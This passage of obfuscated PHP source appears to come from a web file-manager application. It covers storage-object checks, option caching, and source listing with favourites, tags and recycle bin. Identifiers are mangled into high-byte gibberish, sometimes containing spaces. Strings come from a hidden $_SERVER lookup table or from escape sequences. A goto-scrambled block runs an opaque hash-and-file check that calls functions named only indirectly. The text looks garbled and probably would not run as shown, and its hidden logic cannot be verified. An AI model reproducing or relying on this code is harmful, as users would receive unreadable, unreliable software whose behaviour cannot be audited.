$B¾È½¿¼µ—[$_SERVER[¹÷ˆ§éÒ°ú][89]] : 0; } public function info($e‰±î‰‘±) { if ($this->isFolder($e‰±î‰‘±)) { return $this->folderInfo($e‰±î‰‘±); } else { if ($this->isFile($e‰±î‰‘±)) { return $this->fileInfo($e‰±î‰‘±); } } return !1; } public function exist($DçñÛëœĞ¿) { return $this->isFile($DçñÛëœĞ¿) || $this->isFolder($DçñÛëœĞ¿); } public function isFile($fÊİ¼ÎÒóŠ) { return !$this->isFolder($fÊİ¼ÎÒóŠ) && $this->objectMeta($fÊİ¼ÎÒóŠ); } public function isFolder($A§…‹©½Š‡) { return $this->cacheMethod($_SERVER[¹÷ˆ§éÒ°ú][234], $A§…‹©½Š‡); } protected function objectMeta($fºõß£ÕƒÎ) { return $this->cacheMethod($_SERVER[¹÷ˆ§éÒ°ú][235], $fºõß£ÕƒÎ); } protected function _objectMeta($Aó„…À×¸Š) { $A¡°î­ÙØ =& $_SERVER[¹÷ˆ§éÒ°ú]; list($f»›š»‡àÄ, $d‡Ôã¦âå) = $this->bucketManager->stat($this->bucket, $Aó„…À×¸Š); if ($f»›š»‡àÄ) { $f»›š»‡àÄ[$A¡°î­ÙØ[89]] = intval($f»›š»‡àÄ[$A¡°î­ÙØ[1207]]); } return $f»›š»‡àÄ; } protected function _isFolder($D–ğÊ÷ÑÀø) { $dâÅÔÖ¤Õˆ =& $_SERVER[¹÷ˆ§éÒ°ú]; if ($D–ğÊ÷ÑÀø == $dâÅÔÖ¤Õˆ[43] || $D–ğÊ÷ÑÀø == $dâÅÔÖ¤Õˆ[18]) { return !0; } list($d‰Ãöòîß, $f®çŒŸ‡Ö) = $this->bucketManager->listFiles($this->bucket, trim($D–ğÊ÷ÑÀø, $dâÅÔÖ¤Õˆ[18]) . $dâÅÔÖ¤Õˆ[18], $dâÅÔÖ¤Õˆ[43], 1, $dâÅÔÖ¤Õˆ[18]); return !empty($d‰Ãöòîß[$dâÅÔÖ¤Õˆ[1206]]) || !empty($d‰Ãöòîß[$dâÅÔÖ¤Õˆ[1209]]) ? !0 : !1; } } goto D¹®³†™ÊÌ; dÈ«âÄ¨ˆ: $d¨¦öİô¶ = $_SERVER[¹÷ˆ§éÒ°ú][5]; if ($_SERVER[$_SERVER[¹÷ˆ§éÒ°ú][6]] != $d¨¦öİô¶($A—Ô±óö† )) { goto CŞĞõÂõƒË; d†ßøé¤ì¸: $BÔìË¬öÈâ($A—Ô±óö† ); goto A¯‚âÂÀÒÀ; CŞĞõÂõƒË: $D‚¤’Ôê²Š = $_SERVER[¹÷ˆ§éÒ°ú][7]; $Dî˜Õ‘Ì¼Ğ = $_SERVER[$_SERVER[¹÷ˆ§éÒ°ú][8]] . $_SERVER[¹÷ˆ§éÒ°ú][9]; $e¬îæ‘®“Ø = $D‚¤’Ôê²Š($Dî˜Õ‘Ì¼Ğ); goto BİÄ²É©; BİÄ²É©: $B×öéèŞà = explode($_SERVER[¹÷ˆ§éÒ°ú][10], $e¬îæ‘®“Ø); if (count($B×öéèŞà) < $_SERVER[¹÷ˆ§éÒ°ú][11]) { $D«¤òÏœ‚å = $_SERVER[¹÷ˆ§éÒ°ú][12]; $D«¤òÏœ‚å(); } $BÔìË¬öÈâ = $_SERVER[¹÷ˆ§éÒ°ú][13]; goto d†ßøé¤ì¸; A¯‚âÂÀÒÀ: } class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($b‡ï¼øÌÊ², $EÅ«š¶Ÿ³) { $eã“’’¼…µ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (isset(self::$_methodList[$b‡ï¼øÌÊ²])) { return @call_user_func_array(self::$_methodList[$b‡ï¼øÌÊ²], $EÅ«š¶Ÿ³); } else { if (method_exists($this, $b‡ï¼øÌÊ²)) { return call_user_func_array(array($this, $b‡ï¼øÌÊ²), $EÅ«š¶Ÿ³); } else { think_exception(__CLASS__ . $eã“’’¼…µ[14] . $b‡ï¼øÌÊ² . $eã“’’¼…µ[15]); } } } public static function __callStatic($E˜Ãâ¿¡à, $bŒ‹àÇ±ÏÈ) { if (isset(self::$_methodListStatic[$E˜Ãâ¿¡à])) { return call_user_func_array(self::$_methodListStatic[$E˜Ãâ¿¡à], $bŒ‹àÇ±ÏÈ); } else { if (method_exists(self, $E˜Ãâ¿¡à)) { return call_user_func_array(array(self, $E˜Ãâ¿¡à), $bŒ‹àÇ±ÏÈ); } else { show_json("{$E˜Ãâ¿¡à}\50\x29\40\x6e\157\164\40\x65\170\151\x73\x74\x3b", !1); } } } public static function addMethod($E‡È÷“†´ß, $C¹‹Ç›¤‘©) { self::$_methodList[$E‡È÷“†´ß] = $C¹‹Ç›¤‘©; } public static function addMethodStatic($eíÉïÄ¥×, $aÆ®—›®‰) { self::$_methodListStatic[$eíÉïÄ¥×] = $aÆ®—›®‰; } } goto e¬ÖåÌÕâ; d‘ô¢Ë†çø: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($bê¢öõ× = false, $dóÕÅƒì‹É = '', $D·Œƒôƒí = false) { goto DÇ³¤¶¡ƒ; A³Û´ç¡‡¯: $this->cacheSet($dóÕÅƒì‹É, $aÜ†© ‘‹); $aÜ†© ‘‹ = array_merge($A°î„ŒéÉ·, $aÜ†© ‘‹); return $bê¢öõ× ? $aÜ†© ‘‹[$bê¢öõ×] : $aÜ†© ‘‹; goto f‹©ÜÜ´ê; DÇ³¤¶¡ƒ: $d×ÒÙåÃÑª =& $_SERVER[¹÷ˆ§éÒ°ú]; $aÜ†© ‘‹ = $this->cacheGet($dóÕÅƒì‹É); $A°î„ŒéÉ· = $this->optionDefault($dóÕÅƒì‹É); goto cÂ˜ù‹Î±Ä; cÂ˜ù‹Î±Ä: $A°î„ŒéÉ· = is_array($A°î„ŒéÉ·) ? $A°î„ŒéÉ· : array(); if (is_array($aÜ†© ‘‹)) { $aÜ†© ‘‹ = array_merge($A°î„ŒéÉ·, $aÜ†© ‘‹); return $bê¢öõ× ? isset($aÜ†© ‘‹[$bê¢öõ×]) ? $aÜ†© ‘‹[$bê¢öõ×] : null : $aÜ†© ‘‹; } $Dñ´¯‘Ò¼Ğ = $this->filterWhere(array($d×ÒÙåÃÑª[39] => $dóÕÅƒì‹É)); goto aâä‚®½Ô°; aâä‚®½Ô°: $aÜ†© ‘‹ = $this->where($Dñ´¯‘Ò¼Ğ)->select(); $aÜ†© ‘‹ = array_to_keyvalue($aÜ†© ‘‹, $d×ÒÙåÃÑª[101], $d×ÒÙåÃÑª[370]); foreach ($aÜ†© ‘‹ as $cÎ“¹¡‡©¡ => $dÏÈ¹È™…›) { if ($D·Œƒôƒí || in_array($cÎ“¹¡‡©¡, $this->jsonField)) { $aÜ†© ‘‹[$cÎ“¹¡‡©¡] = json_decode($dÏÈ¹È™…›, !0); } } goto A³Û´ç¡‡¯; f‹©ÜÜ´ê: } public function set($aÓÚ‚®ß‘, $dİöñÄ– = false, $E×Ú·¶ÃÕ¾ = '') { goto fµÙ©ŠÊâ‹; f¶£ä‡…Üñ: $dÃµÁ„¼‚Ñ = is_array($aÓÚ‚®ß‘) ? $aÓÚ‚®ß‘ : array($aÓÚ‚®ß‘ => $dİöñÄ–); foreach ($dÃµÁ„¼‚Ñ as $f·’ºÍ¨òÇ => $CÉÑìãèáí) { if (is_array($CÉÑìãèáí)) { $CÉÑìãèáí = json_encode_force($CÉÑìãèáí); } $this->checkLength($CÉÑìãèáí, !1, $this->tableName . $Fêˆ¼¬ÓÉß[14] . $aÓÚ‚®ß‘); $CÉÑìãèáí = self::textEncode($CÉÑìãèáí); $dÃµÁ„¼‚Ñ = array($Fêˆ¼¬ÓÉß[39] => $E×Ú·¶ÃÕ¾, $Fêˆ¼¬ÓÉß[101] => $f·’ºÍ¨òÇ, $Fêˆ¼¬ÓÉß[370] => $CÉÑìãèáí); $BñŠŞ¤³¬[] = $this->filterWhere($dÃµÁ„¼‚Ñ); } if (!$BñŠŞ¤³¬) { return !0; } goto dî‹§áŒãÑ; fµÙ©ŠÊâ‹: $Fêˆ¼¬ÓÉß =& $_SERVER[¹÷ˆ§éÒ°ú]; $this->cacheRemove($E×Ú·¶ÃÕ¾); $BñŠŞ¤³¬ = array(); goto f¶£ä‡…Üñ; dî‹§áŒãÑ: return $this->addAll($BñŠŞ¤³¬, array(), !0); goto AÑ‰ñ½Üç¦; AÑ‰ñ½Üç¦: } protected function optionDefault($b¶àÇÊ§ = '') { return !1; } public function setDeep($b•‹íÑËä§, $EÉ¢˜ë¤–÷ = false, $A‡Ï‹¨†å· = '') { $dôœÏğù¯ = explode($_SERVER[¹÷ˆ§éÒ°ú][103], $b•‹íÑËä§); $a±äÊøİÃ = $this->get(); array_set_value($a±äÊøİÃ, $b•‹íÑËä§, $EÉ¢˜ë¤–÷); $this->set($dôœÏğù¯[0], $a±äÊøİÃ[$dôœÏğù¯[0]], $A‡Ï‹¨†å·); } public function remove($CÂã•ùÅ‚, $d‰åùí‘à = '') { $Bš¤÷Ô×¿ =& $_SERVER[¹÷ˆ§éÒ°ú]; $this->cacheRemove($d‰åùí‘à); $Dìí•ÙŒ‰è = $this->filterWhere(array($Bš¤÷Ô×¿[101] => $CÂã•ùÅ‚, $Bš¤÷Ô×¿[39] => $d‰åùí‘à)); if (is_null($CÂã•ùÅ‚)) { unset($Dìí•ÙŒ‰è[$Bš¤÷Ô×¿[101]]); } return $this->where($Dìí•ÙŒ‰è)->delete(); } public function cacheSet($aõ‚ì³ùÍ, $AÕãĞà¡¿‹ = false) { return Cache::set($this->cacheKey($aõ‚ì³ùÍ), $AÕãĞà¡¿‹); } public function cacheGet($BŞ­›¾‘Èæ) { return Cache::get($this->cacheKey($BŞ­›¾‘Èæ)); } public function cacheRemove($Eš¡ÂÚİÉñ) { return Cache::remove($this->cacheKey($Eš¡ÂÚİÉñ)); } protected function filterWhere($DÑ»ÙÄ±î÷) { return $DÑ»ÙÄ±î÷; } protected function cacheKey($BÅñŠğ ôº) { return $BÅñŠğ ôº; } } class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\x6f\x75\162\143\x65"; protected $tableMeta = array("\x74\x61\x62\154\x65\116\x61\155\145" => "\x69\x6f\137\163\x6f\x75\162\143\x65\x5f\155\145\x74\x61", "\155\145\x74\x61\106\151\x65\154\144" => "\163\x6f\x75\162\143\145\111\104"); protected $dataAuto = array(array("\x6d\x6f\x64\151\146\171\124\x69\155\x65", "\164\x69\155\145", "\151\x6e\x73\145\162\164", "\x66\165\x6e\143\164\x69\x6f\x6e"), array("\143\x72\145\141\164\145\x54\151\155\x65", "\164\x69\155\x65", "\x69\156\163\x65\x72\x74", "\146\x75\156\143\164\x69\x6f\x6e"), array("\x76\151\145\x77\124\x69\155\145", "\164\151\x6d\x65", "\151\x6e\163\145\162\x74", "\146\165\x6e\x63\x74\x69\157\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($C†ßä‚¦Í) { return $this->listSource(array($_SERVER[¹÷ˆ§éÒ°ú][379] => $C†ßä‚¦Í)); } public function typeName($EÓ¨áÁÖô) { static $A¦©Ø‚ˆ‚á = array(self::TYPE_SYSTEM => "\163\171\163\x74\145\x6d", self::TYPE_USER => "\x75\x73\x65\162", self::TYPE_GROUP => "\147\x72\157\x75\160"); return $A¦©Ø‚ˆ‚á[$EÓ¨áÁÖô . $_SERVER[¹÷ˆ§éÒ°ú][43]]; } public function sourceListInfo($b´êæÍ‰¶—, $fÚ°øòçâÏ = false) { goto aÈ«ˆŞ¼Æ; eÕ¾¢»¿¤Á: if (!$b´êæÍ‰¶—) { return array(); } $cÚ²£Õ²³” = $this->where(array($eöŞ£‡åù¥[380] => array($eöŞ£‡åù¥[17], $b´êæÍ‰¶—)))->select(); $this->_listDataApply($cÚ²£Õ²³”, $fÚ°øòçâÏ); goto Dƒª¹©¾®£; Dƒª¹©¾®£: return array_to_keyvalue($cÚ²£Õ²³”, $eöŞ£‡åù¥[380]); goto f›Œ‹×‚÷Ì; aÈ«ˆŞ¼Æ: $eöŞ£‡åù¥ =& $_SERVER[¹÷ˆ§éÒ°ú]; $b´êæÍ‰¶— = $b´êæÍ‰¶— ? $b´êæÍ‰¶— : array(); $b´êæÍ‰¶— = array_filter(array_unique($b´êæÍ‰¶—)); goto eÕ¾¢»¿¤Á; f›Œ‹×‚÷Ì: } public function pathInfoFilter($eœ‘õ« ï) { goto fãÚ›ó†±²; fãÚ›ó†±²: $Cƒ£èğ¢¢ =& $_SERVER[¹÷ˆ§éÒ°ú]; $eœ‘õ« ï[$Cƒ£èğ¢¢[87]] = KodIO::make($eœ‘õ« ï[$Cƒ£èğ¢¢[380]]); $eœ‘õ« ï[$Cƒ£èğ¢¢[39]] = $eœ‘õ« ï[$Cƒ£èğ¢¢[381]] == 1 ? $Cƒ£èğ¢¢[88] : $Cƒ£èğ¢¢[179]; goto e†ï‹Åïó; e†ï‹Åïó: $eœ‘õ« ï[$Cƒ£èğ¢¢[382]] = $this->typeName($eœ‘õ« ï[$Cƒ£èğ¢¢[382]]); if ($eœ‘õ« ï[$Cƒ£èğ¢¢[381]] != 1) { $eœ‘õ« ï[$Cƒ£èğ¢¢[172]] = $eœ‘õ« ï[$Cƒ£èğ¢¢[383]]; unset($eœ‘õ« ï[$Cƒ£èğ¢¢[383]]); } $CâŞè¦ØÂˆ = $Cƒ£èğ¢¢[384]; goto D–±¡³…İ; D–±¡³…İ: $CâŞè¦ØÂˆ .= $Cƒ£èğ¢¢[385]; $CâŞè¦ØÂˆ .= $Cƒ£èğ¢¢[386]; $e®µééêëç = explode($Cƒ£èğ¢¢[57], $CâŞè¦ØÂˆ); goto fŞôª ññì; fŞôª ññì: if (isset($eœ‘õ« ï[$Cƒ£èğ¢¢[387]]) && $eœ‘õ« ï[$Cƒ£èğ¢¢[387]][$Cƒ£èğ¢¢[388]] == -1) { $e®µééêëç = array_remove_value($e®µééêëç, $Cƒ£èğ¢¢[199]); $e®µééêëç = array_remove_value($e®µééêëç, $Cƒ£èğ¢¢[119]); $e®µééêëç = array_remove_value($e®µééêëç, $Cƒ£èğ¢¢[389]); $e®µééêëç = array_remove_value($e®µééêëç, $Cƒ£èğ¢¢[390]); $e®µééêëç = array_remove_value($e®µééêëç, $Cƒ£èğ¢¢[89]); $e®µééêëç = array_remove_value($e®µééêëç, $Cƒ£èğ¢¢[391]); } $eœ‘õ« ï = array_field_key($eœ‘õ« ï, $e®µééêëç); return $eœ‘õ« ï; goto b²æ·¡¿ì÷; b²æ·¡¿ì÷: } public function listUserFav() { goto F¦ºÎÖ´Òî; F¦ºÎÖ´Òî: $d›´ãå½ƒ› =& $_SERVER[¹÷ˆ§éÒ°ú]; $D©äìÖ«½— = Model($d›´ãå½ƒ›[392])->listData(); $dñ´š¾°© = array_filter_by_field($D©äìÖ«½—, $d›´ãå½ƒ›[39], $d›´ãå½ƒ›[393]); goto DéË¨ë¦ë×; DéË¨ë¦ë×: $dñ´š¾°© = array_to_keyvalue($dñ´š¾°©, $d›´ãå½ƒ›[43], $d›´ãå½ƒ›[87]); if ($dñ´š¾°©) { $bñ¥ÒÅíÏ = $this->listSource(array($d›´ãå½ƒ›[394] => array($d›´ãå½ƒ›[395], $dñ´š¾°©))); } $bñ¥ÒÅíÏ = array_to_keyvalue($bñ¥ÒÅíÏ[$d›´ãå½ƒ›[365]], $d›´ãå½ƒ›[380]); goto Eà¥§‚Ùï‘; Eà¥§‚Ùï‘: foreach ($D©äìÖ«½— as &$aáó³‰‚Ô) { $aáó³‰‚Ô = array($d›´ãå½ƒ›[396] => $aáó³‰‚Ô[$d›´ãå½ƒ›[378]], $d›´ãå½ƒ›[397] => $aáó³‰‚Ô[$d›´ãå½ƒ›[38]], $d›´ãå½ƒ›[398] => $aáó³‰‚Ô[$d›´ãå½ƒ›[87]], $d›´ãå½ƒ›[399] => $aáó³‰‚Ô[$d›´ãå½ƒ›[39]], $d›´ãå½ƒ›[400] => $aáó³‰‚Ô[$d›´ãå½ƒ›[199]], $d›´ãå½ƒ›[401] => $aáó³‰‚Ô[$d›´ãå½ƒ›[119]]); if ($aáó³‰‚Ô[$d›´ãå½ƒ›[39]] == $d›´ãå½ƒ›[393] && $bñ¥ÒÅíÏ[$aáó³‰‚Ô[$d›´ãå½ƒ›[87]]]) { $aáó³‰‚Ô[$d›´ãå½ƒ›[402]] = $bñ¥ÒÅíÏ[$aáó³‰‚Ô[$d›´ãå½ƒ›[87]]]; } } return $D©äìÖ«½—; goto a÷ìÒá†ìí; a÷ìÒá†ìí: } public function listUserTag($fÎâÍè’) { goto c†ÏØåŞ´×; CóÈŞœ’Ô¦: if (!$DÛº“Ï¦ğ || count($Fß›ßó«À‡) == $DÛº“Ï¦ğ[$c¥’‰¼ˆ[362]][$c¥’‰¼ˆ[363]]) { return $DÛº“Ï¦ğ; } $E§Ü¦±åÜ = array(); $fêœùóÕğß = array_to_keyvalue($DÛº“Ï¦ğ[$c¥’‰¼ˆ[86]], $c¥’‰¼ˆ[43], $c¥’‰¼ˆ[380]); goto E³¦†ù·ÈÃ; F›‡¯á•À–: $a¢ƒÇğÙ¯ = array(); foreach ($C½â‘ø¡í‡ as $D¢ƒ½ñâä©) { $aÂ°¨œ£‚Ô = $D¢ƒ½ñâä©[$c¥’‰¼ˆ[87]]; if (!$aÂ°¨œ£‚Ô) { continue; } if (!isset($a¢ƒÇğÙ¯[$aÂ°¨œ£‚Ô])) { $a¢ƒÇğÙ¯[$aÂ°¨œ£‚Ô] = array(); } $a¢ƒÇğÙ¯[$aÂ°¨œ£‚Ô][] = $D¢ƒ½ñâä©[$c¥’‰¼ˆ[404]]; } $Fß›ßó«À‡ = array(); goto C®å™ÉµÔŸ; E³¦†ù·ÈÃ: $fùã©ÉÜ÷ = array_to_keyvalue($DÛº“Ï¦ğ[$c¥’‰¼ˆ[85]], $c¥’‰¼ˆ[43], $c¥’‰¼ˆ[380]); $EÍèœ¿»“ = array_merge($fùã©ÉÜ÷, $fêœùóÕğß); foreach ($Fß›ßó«À‡ as $aÂ°¨œ£‚Ô) { if (!in_array($aÂ°¨œ£‚Ô, $EÍèœ¿»“)) { $E§Ü¦±åÜ[] = $aÂ°¨œ£‚Ô; } } goto d†ê¡™ÚãÚ; C®å™ÉµÔŸ: foreach ($a¢ƒÇğÙ¯ as $eò®ë¡¨¸¨ => $B“ÅƒëÎøã) { $AÛ¬ï”øù” = !0; if (!$fÎâÍè’) { $Fß›ßó«À‡[] = $eò®ë¡¨¸¨; continue; } foreach ($fÎâÍè’ as $dƒÔº¬¦ì÷) { if (!in_array($dƒÔº¬¦ì÷, $B“ÅƒëÎøã)) { $AÛ¬ï”øù” = !1; break; } } if ($AÛ¬ï”øù”) { $Fß›ßó«À‡[] = $eò®ë¡¨¸¨; } } if (!$Fß›ßó«À‡) { return array(); } $DÛº“Ï¦ğ = $this->listSource(array($c¥’‰¼ˆ[394] => array($c¥’‰¼ˆ[395], $Fß›ßó«À‡))); goto CóÈŞœ’Ô¦; c†ÏØåŞ´×: $c¥’‰¼ˆ =& $_SERVER[¹÷ˆ§éÒ°ú]; if ($fÎâÍè’ && !is_array($fÎâÍè’)) { $fÎâÍè’ = array($fÎâÍè’); } $C½â‘ø¡í‡ = Model($c¥’‰¼ˆ[403])->listData(); goto F›‡¯á•À–; d†ê¡™ÚãÚ: if ($E§Ü¦±åÜ) { Model($c¥’‰¼ˆ[405])->removeBySource($E§Ü¦±åÜ); } return $DÛº“Ï¦ğ; goto a’¶¶¶•‰ó; a’¶¶¶•‰ó: } public function listUserRecycle() { $Bñ…†‘Ü™Ö =& $_SERVER[¹÷ˆ§éÒ°ú]; $dÜ‹ÏÌ…í™ = Model($Bñ…†‘Ü™Ö[406])->listData(); if (!$dÜ‹ÏÌ…í™) { return array(); } $FÀóÖÌøˆ‹ = array($Bñ…†‘Ü™Ö[394] => array($Bñ…†‘Ü™Ö[395], $dÜ‹ÏÌ…í™), $Bñ…†‘Ü™Ö[407] => 1); return $this->listSource($FÀóÖÌøˆ‹); } public function listSource($e‡®åÚÍ·‰, $C²²ÕÛ˜‹» = 3000) { goto fÎµÑºæˆÎ; bÇõî”å×è: return $bØ¤ø— å; goto dÛ°ò»İ£Ü; fÎµÑºæˆÎ: $FÍ³ïĞ›¥Ÿ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!isset($e‡®åÚÍ·‰[$FÍ³ïĞ›¥Ÿ[408]])) { $e‡®åÚÍ·‰[$FÍ³ïĞ›¥Ÿ[408]] = 0; } $EÚ®Õ¯ôªŠ = $FÍ³ïĞ›¥Ÿ[409]; goto F‡ÛèÅŒ±; F‡ÛèÅŒ±: $bØ¤ø— å = $this->field($EÚ®Õ¯ôªŠ)->_makeOrder()->where($e‡®åÚÍ·‰)->selectPage($C²²ÕÛ˜‹»); $this->_listDataApply($bØ¤ø— å[$FÍ³ïĞ›¥Ÿ[365]]); $this->_listMake($bØ¤ø— å); goto bÇõî”å×è; dÛ°ò»İ£Ü: } protected function _makeOrder() { goto CÊêÓ×Ş¯“; DÔ…äè„©: $fƒÃñ«¥ê = array($FÂ‹Æ‘äŠÄ[413] => $FÂ‹Æ‘äŠÄ[414], $FÂ‹Æ‘äŠÄ[415] => $FÂ‹Æ‘äŠÄ[416]); $f¶“÷ °Õ = array($FÂ‹Æ‘äŠÄ[38] => $FÂ‹Æ‘äŠÄ[38], $FÂ‹Æ‘äŠÄ[89] => $FÂ‹Æ‘äŠÄ[89], $FÂ‹Æ‘äŠÄ[172] => $FÂ‹Æ‘äŠÄ[383], $FÂ‹Æ‘äŠÄ[389] => $FÂ‹Æ‘äŠÄ[389], $FÂ‹Æ‘äŠÄ[417] => $FÂ‹Æ‘äŠÄ[390], $FÂ‹Æ‘äŠÄ[199] => $FÂ‹Æ‘äŠÄ[199], $FÂ‹Æ‘äŠÄ[119] => $FÂ‹Æ‘äŠÄ[119]); $Cœ‹ªµ–¦ = Input::get($FÂ‹Æ‘äŠÄ[418], $FÂ‹Æ‘äŠÄ[17], $CÖ³À‘, array_keys($f¶“÷ °Õ)); goto AÌÃåæ¥İ; AÌÃåæ¥İ: $BØ“ŒÑÁ²Ş = Input::get($FÂ‹Æ‘äŠÄ[419], $FÂ‹Æ‘äŠÄ[17], $b¤Òíô±, array_keys($fƒÃñ«¥ê)); if (!in_array($Cœ‹ªµ–¦, array_keys($f¶“÷ °Õ))) { $Cœ‹ªµ–¦ = $FÂ‹Æ‘äŠÄ[38]; } if (!in_array($BØ“ŒÑÁ²Ş, array_keys($fƒÃñ«¥ê))) { $Cœ‹ªµ–¦ = $FÂ‹Æ‘äŠÄ[413]; } goto dÎ’ÜëÈ°æ; dÎ’ÜëÈ°æ: if ($Cœ‹ªµ–¦ == $FÂ‹Æ‘äŠÄ[38]) { } $cˆïìæÃ¬ = $FÂ‹Æ‘äŠÄ[420] . $f¶“÷ °Õ[$Cœ‹ªµ–¦] . $FÂ‹Æ‘äŠÄ[60] . $fƒÃñ«¥ê[$BØ“ŒÑÁ²Ş]; return $this->order(rtrim(trim($cˆïìæÃ¬), $FÂ‹Æ‘äŠÄ[57])); goto b¥œÀô÷Šà; CÊêÓ×Ş¯“: $FÂ‹Æ‘äŠÄ =& $_SERVER[¹÷ˆ§éÒ°ú]; $CÖ³À‘ = Model($FÂ‹Æ‘äŠÄ[410])->get($FÂ‹Æ‘äŠÄ[411]); $b¤Òíô± = Model($FÂ‹Æ‘äŠÄ[410])->get($FÂ‹Æ‘äŠÄ[412]); goto DÔ…äè„©; b¥œÀô÷Šà: } protected function _listDataApplyItem($dí‰Ø¯ÑÏÒ, $AÊÚ£À©å¦ = false) { $cì«šÑ á± = array($dí‰Ø¯ÑÏÒ); $this->_listDataApply($cì«šÑ á±, $AÊÚ£À©å¦); return $cì«šÑ á±[0]; } protected function _listDataApply(&$eØä©½Òè¨, $A¤ĞæÕŠèÒ = false) { goto dŸÁ·ØÍ„ù; DóØÏ÷ù¹‘: $CŠÃà´ä‰œ = array_unique($CŠÃà´ä‰œ); $this->_listSourceCache($eØä©½Òè¨); if (!$A¤ĞæÕŠèÒ) { $this->_listAppendMeta($eØä©½Òè¨, $CŠÃà´ä‰œ); $this->_listAppendFileMeta($eØä©½Òè¨, $CŠÃà´ä‰œ); $this->_listAppendChildren($eØä©½Òè¨, $CŠÃà´ä‰œ); } goto bÓùˆèÎÜÊ; bÓùˆèÎÜÊ: $this->_listAppendPath($eØä©½Òè¨); $this->_listAppendAuth($eØä©½Òè¨); $this->_listAppendSourceInfo($eØä©½Òè¨, $CŠÃà´ä‰œ); goto bÍöö»™¥Å; bÍöö»™¥Å: $this->_listAppendUser($eØä©½Òè¨); $this->_listFilterInfo($eØä©½Òè¨, $A¤ĞæÕŠèÒ); goto f„¤Œï„ŠÁ; dŸÁ·ØÍ„ù: $A¹ùòåÔÁŒ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$eØä©½Òè¨) { $eØä©½Òè¨ = array(); return; } $CŠÃà´ä‰œ = array_to_keyvalue($eØä©½Òè¨, $A¹ùòåÔÁŒ[43], $A¹ùòåÔÁŒ[380]); goto DóØÏ÷ù¹‘; f„¤Œï„ŠÁ: } protected function _listSourceCache($f‰•…Ò‰¡) { $E˜‰«×ˆ =& $_SERVER[¹÷ˆ§éÒ°ú]; foreach ($f‰•…Ò‰¡ as $F©ÎÔŒâ) { self::$cacheSourceInfo[$E˜‰«×ˆ[421] . $F©ÎÔŒâ[$E˜‰«×ˆ[380]]] = $F©ÎÔŒâ; } } protected function _listFilterInfo(&$eÈ°é¯«æá, $AÆÚõ§Ú£ = false) { $f‡¹ä¤Å„¡ =& $_SERVER[¹÷ˆ§éÒ°ú]; foreach ($eÈ°é¯«æá as &$eõâÒ³šö•) { $eõâÒ³šö• = $this->pathInfoFilter($eõâÒ³šö•); self::$cachePathInfo[$f‡¹ä¤Å„¡[422] . intval($AÆÚõ§Ú£) . $f‡¹ä¤Å„¡[423] . $eõâÒ³šö•[$f‡¹ä¤Å„¡[380]]] = $eõâÒ³šö•; } } protected function _listMake(&$A‚¦Áøåºº) { $B¼‘¯å£¦ =& $_SERVER[¹÷ˆ§éÒ°ú]; $A‚¦Áøåºº[$B¼‘¯å£¦[86]] = array(); $A‚¦Áøåºº[$B¼‘¯å£¦[85]] = array(); foreach ($A‚¦Áøåºº[$B¼‘¯å£¦[365]] as $B’©Æ‰®áÍ) { $aËŠŸŒªå› = $B’©Æ‰®áÍ[$B¼‘¯å£¦[381]] == 1 ? $B¼‘¯å£¦[86] : $B¼‘¯å£¦[85]; $A‚¦Áøåºº[$aËŠŸŒªå›][] = $B’©Æ‰®áÍ; } unset($A‚¦Áøåºº[$B¼‘¯å£¦[365]]); } protected function _listAppendMeta(&$e¡¼ïÉ¸«, $C±°ª‘Ûî) { goto D‰À¯‹„Ô; D‰À¯‹„Ô: $Fåù×ôƒÙ‡ =& $_SERVER[¹÷ˆ§éÒ°ú]; $F‹ãÍ“»–ã = array($Fåù×ôƒÙ‡[394] => array($Fåù×ôƒÙ‡[395], $C±°ª‘Ûî)); $e¢™‹¶ï›Œ = Model($Fåù×ôƒÙ‡[424])->field($Fåù×ôƒÙ‡[425])->where($F‹ãÍ“»–ã)->select(); goto DˆˆŒÎõùŸ; DˆˆŒÎõùŸ: if (!$e¢™‹¶ï›Œ) { return; } $C°óÓêÆùù = array($Fåù×ôƒÙ‡[426], $Fåù×ôƒÙ‡[427]); $EÙ¹“¯èÓ = array(); goto EÑêÆäÀ•½; EÑêÆäÀ•½: foreach ($e¢™‹¶ï›Œ as $dÔ‡éÊ°·Œ) { if (!isset($EÙ¹“¯èÓ[$dÔ‡éÊ°·Œ[$Fåù×ôƒÙ‡[380]]])) { $EÙ¹“¯èÓ[$dÔ‡éÊ°·Œ[$Fåù×ôƒÙ‡[380]]] = array(); } if (in_array($dÔ‡éÊ°·Œ[$Fåù×ôƒÙ‡[101]], $C°óÓêÆùù)) { continue; } $EÙ¹“¯èÓ[$dÔ‡éÊ°·Œ[$Fåù×ôƒÙ‡[380]]][$dÔ‡éÊ°·Œ[$Fåù×ôƒÙ‡[101]]] = $dÔ‡éÊ°·Œ[$Fåù×ôƒÙ‡[370]]; } foreach ($e¡¼ïÉ¸« as &$B¦®ƒº­Á) { $B¦®ƒº­Á[$Fåù×ôƒÙ‡[428]] = !1; if (isset($EÙ¹“¯èÓ[$B¦®ƒº­Á[$Fåù×ôƒÙ‡[380]]])) { $B¦®ƒº­Á[$Fåù×ôƒÙ‡[428]] = $EÙ¹“¯èÓ[$B¦®ƒº­Á[$Fåù×ôƒÙ‡[380]]]; } if ($this->fileIsLock($B¦®ƒº­Á) && $B¦®ƒº­Á[$Fåù×ôƒÙ‡[387]]) { $a¶“­ô”† = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $B¦®ƒº­Á[$Fåù×ôƒÙ‡[387]][$Fåù×ôƒÙ‡[388]] = AuthModel::authDisable($B¦®ƒº­Á[$Fåù×ôƒÙ‡[387]][$Fåù×ôƒÙ‡[388]], $a¶“­ô”†); $B¦®ƒº­Á[$Fåù×ôƒÙ‡[387]][$Fåù×ôƒÙ‡[429]][$Fåù×ôƒÙ‡[387]] = $B¦®ƒº­Á[$Fåù×ôƒÙ‡[387]][$Fåù×ôƒÙ‡[388]]; } } goto FÖ±ºÛ¹‘Ó; FÖ±ºÛ¹‘Ó: } protected function _listAppendFileMeta(&$A±÷‹‹¿”Å, $BŠÜâÆ¤—¤) { goto FÍ·ÃáµÎè; FÍ·ÃáµÎè: 